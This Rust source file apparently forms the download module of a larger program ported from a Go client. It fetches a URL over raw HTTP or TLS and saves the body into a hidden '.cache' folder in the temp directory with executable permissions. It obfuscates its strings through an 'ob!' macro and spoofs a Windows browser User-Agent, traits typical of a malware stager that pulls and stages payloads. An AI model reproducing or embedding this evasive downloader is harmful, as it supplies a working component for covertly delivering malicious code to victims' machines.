use tokio::io::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};

trait Stream: AsyncRead + AsyncWrite + Unpin + Send {}
impl<T> Stream for T where T: AsyncRead + AsyncWrite + Unpin + Send {}

/// Minimal HTTP/1.1 GET (http/https), like the Go client's download().
pub async fn fetch_and_store(url: &str) -> Result<String, String> {
    let (host, port, path, tls) = parse_url(url)?;
    let mut stream: Box<dyn Stream> = if tls {
        Box::new(crate::tl::connect(&host, port, &host).await?)
    } else {
        Box::new(
            tokio::net::TcpStream::connect((host.as_str(), port))
                .await
                .map_err(|e| e.to_string())?,
        )
    };

    let ua = crate::ob!("Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
    let req = format!(
        "GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nConnection: close\r\n\r\n"
    );
    stream.write_all(req.as_bytes()).await.map_err(|e| e.to_string())?;

    let mut raw = Vec::new();
    stream.read_to_end(&mut raw).await.map_err(|e| e.to_string())?;

    // split headers/body
    let hdr_end = raw
        .windows(4)
        .position(|w| w == b"\r\n\r\n")
        .ok_or("bad http response")?;
    let headers = String::from_utf8_lossy(&raw[..hdr_end]).to_string();
    let mut body = raw[hdr_end + 4..].to_vec();

    let status = headers
        .lines()
        .next()
        .unwrap_or_default()
        .split_whitespace()
        .nth(1)
        .unwrap_or("0")
        .to_string();
    if !status.starts_with('2') && !status.starts_with('3') {
        return Err(format!("http status {status}"));
    }

    // chunked transfer decoding (simple)
    if headers.to_lowercase().contains("transfer-encoding: chunked") {
        body = decode_chunked(&body);
    }

    let name = path
        .rsplit('/')
        .find(|s| !s.is_empty())
        .unwrap_or("blob")
        .to_string();

    let dir = store_dir()?;
    let path = dir.join(name);
    let mut f = tokio::fs::File::create(&path).await.map_err(|e| e.to_string())?;
    f.write_all(&body).await.map_err(|e| e.to_string())?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = tokio::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o700)).await;
    }
    Ok(path.to_string_lossy().to_string())
}

fn parse_url(url: &str) -> Result<(String, u16, String, bool), String> {
    let (scheme, rest) = match url.split_once("://") {
        Some(x) => x,
        None => return Err("no scheme".into()),
    };
    let (hostport, path) = match rest.find('/') {
        Some(i) => (&rest[..i], &rest[i..]),
        None => (rest, "/"),
    };
    let (host, port) = match hostport.rsplit_once(':') {
        Some((h, p)) => (
            h.to_string(),
            p.parse::<u16>().map_err(|_| "bad port".to_string())?,
        ),
        None => (
            hostport.to_string(),
            match scheme {
                "https" => 443,
                _ => 80,
            },
        ),
    };
    Ok((host, port, path.to_string(), scheme == "https"))
}

fn decode_chunked(data: &[u8]) -> Vec<u8> {
    let mut out = Vec::new();
    let mut pos = 0;
    loop {
        let Some(line_end) = data[pos..].windows(2).position(|w| w == b"\r\n") else {
            break;
        };
        let size_str = String::from_utf8_lossy(&data[pos..pos + line_end]);
        let size = usize::from_str_radix(size_str.trim().split(';').next().unwrap_or("0"), 16)
            .unwrap_or(0);
        pos += line_end + 2;
        if size == 0 {
            break;
        }
        let end = (pos + size).min(data.len());
        out.extend_from_slice(&data[pos..end]);
        pos = end + 2;
    }
    out
}

pub fn store_dir() -> Result<std::path::PathBuf, String> {
    let base = std::env::temp_dir().join(crate::ob!(".cache"));
    std::fs::create_dir_all(&base).map_err(|e| e.to_string())?;
    Ok(base)
}
